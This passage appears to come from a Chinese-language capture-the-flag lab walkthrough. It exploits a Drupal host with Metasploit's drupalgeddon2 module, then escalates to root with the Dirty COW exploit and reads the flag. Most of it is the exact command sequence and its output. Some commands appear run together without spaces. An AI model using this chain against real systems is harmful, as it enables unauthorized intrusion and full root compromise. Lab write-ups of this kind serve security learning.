四、漏洞利用

1、打开kali上的MSF，搜索Drupal

search drupal


2、使用

exploit/unix/webapp/drupal_drupalgeddon2模块

不是说好的remote code execution(远程代码执行)吗？所有exploit我都试了，只有这个能getshell

use exploit/unix/webapp/drupal_drupalgeddon2

设置好目标IP

set rhosts 192.168.1.109

设置好目标IP端口

set rport 1898

开始运行

exploit

得到目标shell

 

五、脏牛漏洞提权

1、上传linux-exploit-suggester.sh到目标主机

下载链接：https://github.com/mzet-/linux-exploit-suggester

upload /home/dgz/linux-exploit-suggester.sh/tmp/test.sh

成功上传


2、进入shell，操作更方便

shell

 

3、切换到tmp目录下，赋予test.sh可执行权限，然后运行test.sh

cd /tmpchmod +x test.sh./test.sh

 

4、查看可以利用的提权漏洞

这里看到，存在脏牛提权漏洞

 

5、上传脏牛漏洞exp

下载链接：https://github.com/gbonacini/CVE-2016-5195

upload /home/dgz/dcow.cpp /tmp/dcow.cpp


6、编译dcow.cpp

g++ -Wall -pedantic -O2 -std=c++11 -pthread-o dcow dcow.cpp -lutil

 

7、用python创建一个交互式会话

为什么要创建一个这样的会话？按照小迪老师的来讲，因为你用MSF模块得到的meterpreter和shell并不是交互式的，也就是说，在meterpreter下面我们切换root用户的时候，你无法提交密码，所以需要用创建一个交互式的会话，才能正常提交密码，从而提权至root

python -c 'import pty;pty.spawn("/bin/bash")'


8、运行脏牛exp

./dcow


显示以下内容即代表漏洞利用成功

Root password is:   dirtyCowFun

Enjoy! :-)

 

9、切换到root用户，密码为dirtyCowFun

su root

成功提权至root

 

10、找寻flag

cd /rootcat flag.txt

flag: 9740616875908d91ddcdaa8aea3af366
